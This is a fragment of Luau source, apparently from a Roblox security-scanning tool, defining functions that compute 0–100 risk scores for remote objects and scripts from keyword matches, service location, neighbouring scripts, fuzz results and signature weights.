-- §15  RISK SCORING ENGINE
-- ════════════════════════════════════════════════════════════════════════

-- Scores are clamped 0-100.
local function calcRemoteRisk(entry)
    local score = 0
    -- Name heuristic match
    if entry.keyword then score += 40 end
    -- High-risk service location
    if entry.service == "ServerScriptService" then score += 15
    elseif entry.service == "ServerStorage"   then score += 10 end
    -- Has a script sibling (a remote inside a model that also has a script is very suspicious)
    local parent = entry.inst and entry.inst.Parent
    if parent then
        for _, c in ipairs(parent:GetChildren()) do
            if c:IsA("Script") or c:IsA("LocalScript") or c:IsA("ModuleScript") then score += 12; break end
        end
    end
    -- Fuzz result risk delta
    score += (entry.fuzzRisk or 0)
    return math.min(score, 100)
end

local function calcScriptRisk(flags, signatures)
    local score = 0
    for _, f in ipairs(flags)      do score += (f.w or 5)  end
    for _, sig in ipairs(signatures) do score += sig.risk  end
    return math.min(score, 100)
end

